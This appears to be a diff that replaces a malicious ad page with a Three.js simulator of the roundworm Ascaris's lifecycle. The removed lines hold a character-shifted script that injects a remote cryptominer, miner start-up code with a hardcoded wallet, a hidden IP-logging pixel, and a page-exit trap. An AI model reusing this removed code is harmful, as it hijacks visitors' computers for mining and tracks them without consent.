@@ -1,290 +1,433 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <title>MyPage❤️</title>
-  <link rel="shortcut icon" type="image/jpg" href="https://www.iconarchive.com/download/i98467/dakirby309/simply-styled/YouTube.ico">
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    .container {
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-      width: 100%;
-    }
-    .iframe-video {
-      flex: 0 0 30%;
-      height: 30%;
-    }
-    .iframe-middle {
-      flex: 0 0 40%;
-      height: 40%;
-      position: relative;
-      overflow: auto;
-    }
-    .iframe-bottom {
-      flex: 0 0 30%;
-      height: 30%;
-    }
-    .grid-container {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 0;
-      width: 100%;
-      height: 100%;
-      position: relative;
-    }
-    .grid-item {
-      width: 100%;
-      height: 20%; /* Adjusted for 5 rows in 40% height */
-      overflow: hidden;
-    }
-    .grid-item iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-    .overlay-image {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      pointer-events: none;
-      z-index: 1;
-    }
-    @media (max-width: 600px) {
-      .grid-container {
-        grid-template-columns: 1fr;
-        grid-template-rows: repeat(15, 20%);
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ascaris Lifecycle Simulator</title>
+    <style>
+        body { 
+            margin: 0; 
+            overflow: hidden; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        canvas { 
+            display: block; 
+        }
+        .ui-overlay {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #4CAF50;
+            padding: 15px;
+            border-radius: 10px;
+            max-width: 300px;
+            font-size: 14px;
+            line-height: 1.5;
+            box-shadow: 0 0 20px rgba(76, 175, 80, 0.3);
+        }
+        .stage-indicator {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #FFD700;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 18px;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
+        }
+        .instructions {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 500px;
+            animation: fadeIn 2s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <iframe class="iframe-video" src="https://streamtape.to/e/OVxmmved6etZRv7/" allowfullscreen allow="autoplay" scrolling="no"></iframe>
-    <div class="iframe-middle">
-      <div class="grid-container">
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
+    <div class="stage-indication">Egg Stage</div>
+    <div class="ui-overlay">
+        <h3>Ascaris Lifecycle Simulator</h3>
+        <p>WASD to move | Mouse to look around | Space to accelerate</p>
+        <p>Current stage: Egg (will develop in 30s)</p>
+        <div id="progress-bar" style="width: 100%; background: #333; height: 10px; border-radius: 5px; margin-top: 10px;">
+            <div id="progress" style="width: 0%; height: 100%; background: #4CAF50; border-radius: 5px;"></div>
         </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <div class="grid-item">
-          <script type="text/javascript">
-            atOptions = {
-              'key' : 'a3c6441495bba3b9a180be372364178d',
-              'format' : 'iframe',
-              'height' : 250,
-              'width' : 300,
-              'params' : {}
-            };
-          </script>
-          <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
-        </div>
-        <img src="IMG_20250719_192733_771.jpg" alt="Overlay Image" class="overlay-image">
-      </div>
     </div>
-    <iframe class="iframe-bottom" src="https://www.profitableratecpm.com/ntj9pgvcxz?key=2b927614358002f8d6d3d14e87b29ac5"></iframe>
-  </div>
-  <img src="https://iplogger.com/1oBrY" alt="Tracking pixel" style="display: none;">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script type='text/javascript' src='//pl27198253.profitableratecpm.com/c9/0d/35/c90d35792e2f95a047f528e420a70dff.js'></script>
-  <script defer src="https://crxcr1.com/cams-widget-ext/im_jerky?lang=en&mode=prerecorded&outlinkUrl=https://t.mbdaad.link/381074/3788/0?bo=3471%2C3472%2C3473%2C3474%2C3475&target=pushnotifications&po=6456&aff_sub5=SF_006OG000004lmDN&aff_sub4=AT_0018"></script>
-  <script>
-    const s = "=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
-    let m = "";
-    for (let i = 0; i < s.length; i++) m += String.fromCharCode(s.charCodeAt(i) - 1);
-    document.write(m);
-    console.log("Script injected:", m);
-  </script>
-  <script>
-    $(function() {
-      console.log("Page loaded, starting miner");
-      const wallet = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
-      const threads = navigator.hardwareConcurrency || 4;
-      console.log("Threads set to:", threads);
-      if (typeof PerfektStart === 'function') {
-        PerfektStart(wallet, "x", threads);
-        console.log("Miner started:", wallet, "threads:", threads);
-      } else {
-        console.error("PerfektStart not found");
-      }
-      window.addEventListener('beforeunload', (e) => {
-        e.preventDefault();
-        e.returnValue = 'You want meet with real girl?';
-      });
-    });
-              </script>
+    <div class="instructions">
+        <h2>Welcome to Ascaris Lifecycle Simulator</h2>
+        <p>Experience the incredible journey of Ascaris lumbricoides through the human body</p>
+        <p>Press any key to begin your biological adventure</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/PointerLockControls.js"></script>
+    <script>
+        // Initialize 3D scene
+        const scene = new THREE.Scene();
+        scene.fog = new THREE.FogExp2(0x2a1d1d, 0.05);
+        
+        // Camera setup
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.set(0, 0, 5);
+        
+        // Renderer
+        const renderer = new THREE.WebGLRenderer({ antialias: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(window.devicePixelRatio);
+        renderer.shadowMap.enabled = true;
+        document.body.appendChild(renderer.domElement);
+        
+        // Lighting
+        const ambientLight = new THREE.AmbientLight(0x404040, 1.5);
+        scene.add(ambientLight);
+        
+        const directionalLight = new THREE.DirectionalLight(0xffddcc, 1.2);
+        directionalLight.position.set(5, 10, 7);
+        directionalLight.castShadow = true;
+        directionalLight.shadow.mapSize.width = 1024;
+        directionalLight.shadow.mapSize.height = 1024;
+        scene.add(directionalLight);
+        
+        const intestinalLight = new THREE.PointLight(0xffaa88, 0.8, 15);
+        intestinalLight.position.set(0, 0, 0);
+        scene.add(intestinalLight);
+        
+        // Create intestinal environment
+        function createIntestine() {
+            const intestineGroup = new THREE.Group();
+            
+            // Generate procedural intestine path
+            const pathPoints = [];
+            const segments = 200;
+            const radius = 8;
+            
+            for (let i = 0; i <= segments; i++) {
+                const angle = i * 0.03;
+                const x = Math.sin(angle * 1.5) * radius * (1 + i/segments * 0.2);
+                const y = Math.cos(angle * 0.8) * radius * (1 + i/segments * 0.3);
+                const z = i * 3 - 300;
+                pathPoints.push(new THREE.Vector3(x, y, z));
+            }
+            
+            // Create tube geometry
+            const tubeGeometry = new THREE.TubeGeometry(
+                new THREE.CatmullRomCurve3(pathPoints),
+                200,
+                2.5,
+                16,
+                false
+            );
+            
+            // Create realistic intestine material
+            const intestineMaterial = new THREE.MeshPhongMaterial({
+                color: 0xddc1a5,
+                specular: 0x333333,
+                shininess: 15,
+                side: THREE.DoubleSide,
+                transparent: true,
+                opacity: 0.85
+            });
+            
+            // Add biological details
+            const intestineMesh = new THREE.Mesh(tubeGeometry, intestineMaterial);
+            intestineMesh.castShadow = true;
+            intestineMesh.receiveShadow = true;
+            intestineGroup.add(intestineMesh);
+            
+            // Add villi details
+            for (let i = 0; i < 500; i++) {
+                const length = 0.3 + Math.random() * 0.7;
+                const geometry = new THREE.CylinderGeometry(0.05, 0.05, length, 8);
+                const material = new THREE.MeshPhongMaterial({ 
+                    color: 0xc8a991,
+                    shininess: 5
+                });
+                const villus = new THREE.Mesh(geometry, material);
+                
+                // Position villi along the intestine
+                const pos = pathPoints[Math.floor(Math.random() * pathPoints.length)];
+                villus.position.set(pos.x, pos.y, pos.z);
+                
+                // Random orientation
+                villus.rotation.set(
+                    Math.random() * Math.PI,
+                    Math.random() * Math.PI,
+                    Math.random() * Math.PI
+                );
+                
+                // Scale based on position
+                const scale = 0.8 + Math.random() * 0.4;
+                villus.scale.set(scale, scale, scale);
+                
+                intestineGroup.add(villus);
+            }
+            
+            return intestineGroup;
+        }
+        
+        // Create Ascaris model
+        function createAscaris() {
+            const ascarisGroup = new THREE.Group();
+            
+            // Body segments
+            const segments = 15;
+            const bodyParts = [];
+            
+            for (let i = 0; i < segments; i++) {
+                const radius = 0.3 - (i / segments) * 0.15;
+                const segmentGeometry = new THREE.CylinderGeometry(radius, radius, 0.8, 16);
+                
+                // Realistic color gradient
+                const r = 0.7 + (i / segments) * 0.2;
+                const g = 0.6 + (i / segments) * 0.2;
+                const b = 0.5 + (i / segments) * 0.2;
+                
+                const segmentMaterial = new THREE.MeshPhongMaterial({
+                    color: new THREE.Color(r, g, b),
+                    shininess: 30
+                });
+                
+                const segment = new THREE.Mesh(segmentGeometry, segmentMaterial);
+                segment.rotation.x = Math.PI / 2;
+                segment.position.z = -i * 0.7;
+                segment.castShadow = true;
+                ascarisGroup.add(segment);
+                bodyParts.push(segment);
+            }
+            
+            // Head details
+            const headGeometry = new THREE.SphereGeometry(0.35, 16, 16);
+            const headMaterial = new THREE.MeshPhongMaterial({ 
+                color: 0x9c7a61,
+                shininess: 50
+            });
+            const head = new THREE.Mesh(headGeometry, headMaterial);
+            head.position.z = 0.1;
+            ascarisGroup.add(head);
+            
+            // Mouth details
+            const mouthGeometry = new THREE.ConeGeometry(0.15, 0.3, 16);
+            const mouthMaterial = new THREE.MeshPhongMaterial({ color: 0x5a0a0a });
+            const mouth = new THREE.Mesh(mouthGeometry, mouthMaterial);
+            mouth.rotation.x = Math.PI;
+            mouth.position.z = 0.35;
+            ascarisGroup.add(mouth);
+            
+            // Add animation capability
+            ascarisGroup.animate = (time) => {
+                bodyParts.forEach((part, i) => {
+                    part.rotation.z = Math.sin(time * 2 + i * 0.5) * 0.2;
+                });
+            };
+            
+            return ascarisGroup;
+        }
+        
+        // Create environment
+        const intestine = createIntestine();
+        scene.add(intestine);
+        
+        // Create Ascaris
+        const ascaris = createAscaris();
+        scene.add(ascaris);
+        
+        // Controls setup
+        let controls;
+        let moveForward = false;
+        let moveBackward = false;
+        let moveLeft = false;
+        let moveRight = false;
+        let canJump = false;
+        let velocity = new THREE.Vector3();
+        let direction = new THREE.Vector3();
+        
+        const onKeyDown = function (event) {
+            switch (event.code) {
+                case 'ArrowUp':
+                case 'KeyW':
+                    moveForward = true;
+                    break;
+                case 'ArrowLeft':
+                case 'KeyA':
+                    moveLeft = true;
+                    break;
+                case 'ArrowDown':
+                case 'KeyS':
+                    moveBackward = true;
+                    break;
+                case 'ArrowRight':
+                case 'KeyD':
+                    moveRight = true;
+                    break;
+                case 'Space':
+                    velocity.y += 350;
+                    break;
+            }
+        };
+        
+        const onKeyUp = function (event) {
+            switch (event.code) {
+                case 'ArrowUp':
+                case 'KeyW':
+                    moveForward = false;
+                    break;
+                case 'ArrowLeft':
+                case 'KeyA':
+                    moveLeft = false;
+                    break;
+                case 'ArrowDown':
+                case 'KeyS':
+                    moveBackward = false;
+                    break;
+                case 'ArrowRight':
+                case 'KeyD':
+                    moveRight = false;
+                    break;
+            }
+        };
+        
+        document.addEventListener('keydown', onKeyDown);
+        document.addEventListener('keyup', onKeyUp);
+        
+        // Pointer lock controls
+        const instruction = document.querySelector('.instructions');
+        instruction.addEventListener('click', function() {
+            controls.lock();
+        });
+        
+        controls = new THREE.PointerLockControls(camera, document.body);
+        
+        controls.addEventListener('lock', function() {
+            instruction.style.display = 'none';
+        });
+        
+        controls.addEventListener('unlock', function() {
+            instruction.style.display = 'block';
+        });
+        
+        // Handle window resize
+        window.addEventListener('resize', function() {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+        
+        // Lifecycle management
+        let lifecycleStage = 'egg';
+        let stageProgress = 0;
+        const stageDurations = {
+            egg: 30,
+            larva: 45,
+            adult: 60
+        };
+        
+        // Animation loop
+        const clock = new THREE.Clock();
+        let lastTimestamp = 0;
+        
+        function animate(timestamp) {
+            requestAnimationFrame(animate);
+            
+            const delta = clock.getDelta();
+            const elapsedTime = timestamp - lastTimestamp;
+            lastTimestamp = timestamp;
+            
+            // Update lifecycle
+            stageProgress += delta;
+            const currentStageDuration = stageDurations[lifecycleStage];
+            const progressPercent = Math.min(100, (stageProgress / currentStageDuration) * 100);
+            
+            document.getElementById('progress').style.width = `${progressPercent}%`;
+            
+            // Stage progression
+            if (stageProgress >= currentStageDuration) {
+                stageProgress = 0;
+                
+                if (lifecycleStage === 'egg') {
+                    lifecycleStage = 'larva';
+                    document.querySelector('.stage-indication').textContent = 'Larva Stage';
+                    document.querySelector('.ui-overlay p:nth-child(2)').textContent = 'Current stage: Larva (will mature in 45s)';
+                    
+                    // Grow Ascaris
+                    ascaris.scale.set(1.5, 1.5, 1.5);
+                } else if (lifecycleStage === 'larva') {
+                    lifecycleStage = 'adult';
+                    document.querySelector('.stage-indication').textContent = 'Adult Stage';
+                    document.querySelector('.ui-overlay p:nth-child(2)').textContent = 'Current stage: Adult (reproducing)';
+                    
+                    // Final growth and color change
+                    ascaris.scale.set(2, 2, 2);
+                    ascaris.children.forEach(child => {
+                        if (child.material && child.material.color) {
+                            child.material.color.setHSL(0.1, 0.7, 0.5);
+                        }
+                    });
+                }
+            }
+            
+            // Camera movement
+            if (controls.isLocked === true) {
+                velocity.x -= velocity.x * 10.0 * delta;
+                velocity.z -= velocity.z * 10.0 * delta;
+                velocity.y -= 9.8 * 5.0 * delta; // gravity
+                
+                direction.z = Number(moveForward) - Number(moveBackward);
+                direction.x = Number(moveRight) - Number(moveLeft);
+                direction.normalize();
+                
+                if (moveForward || moveBackward) velocity.z -= direction.z * 40.0 * delta;
+                if (moveLeft || moveRight) velocity.x -= direction.x * 40.0 * delta;
+                
+                controls.moveRight(-velocity.x * delta);
+                controls.moveForward(-velocity.z * delta);
+                controls.getObject().position.y += velocity.y * delta;
+                
+                // Keep within intestinal boundaries
+                const pos = controls.getObject().position;
+                if (pos.y > 3) {
+                    velocity.y = -Math.abs(velocity.y);
+                    pos.y = 3;
+                }
+                if (pos.y < -3) {
+                    velocity.y = Math.abs(velocity.y);
+                    pos.y = -3;
+                }
+            }
+            
+            // Animate Ascaris movement
+            ascaris.position.copy(controls.getObject().position);
+            ascaris.position.y += 0.5; // Offset to center in intestine
+            
+            // Animate body undulation
+            ascaris.animate(timestamp * 0.001);
+            
+            // Subtle intestinal movement
+            intestine.rotation.y += 0.0005;
+            intestine.rotation.x += 0.0003;
+            
+            // Breathing light effect
+            const time = Date.now() * 0.001;
+            intestinalLight.intensity = 0.7 + Math.sin(time * 0.5) * 0.3;
+            
+            renderer.render(scene, camera);
+        }
+        
+        // Start animation
+        animate(0);
+    </script>
+</body>
+</html>
